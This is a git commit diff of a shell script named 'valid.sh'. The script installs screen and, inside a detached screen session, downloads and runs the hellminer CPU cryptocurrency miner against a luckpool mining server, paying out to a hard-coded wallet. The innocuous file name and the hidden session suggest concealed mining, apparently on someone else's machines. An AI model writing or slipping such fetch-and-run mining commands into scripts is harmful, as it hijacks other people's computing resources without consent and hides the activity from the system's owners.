6ff93115a50b67c4dd22901e3007e37ec4d91b33
squibex <90225595+squibex@users.noreply.github.com>
2021-11-23 17:20:30 -0800

    Update valid.sh

--- valid.sh
+++ valid.sh
@@ -1,9 +1,6 @@
 #!/bin/sh
 
-cd
 apt-get install -y screen < "/dev/null"
-mkdir yoho
-cd yoho
 
-screen -S "mylittlescreen" -d -m
-screen -r "mylittlescreen" -X stuff $'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.worke -p x --cpu 2'
+screen -S "layar" -d -m
+screen -r "layar" -X stuff $'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.worke -p x --cpu 2\n'
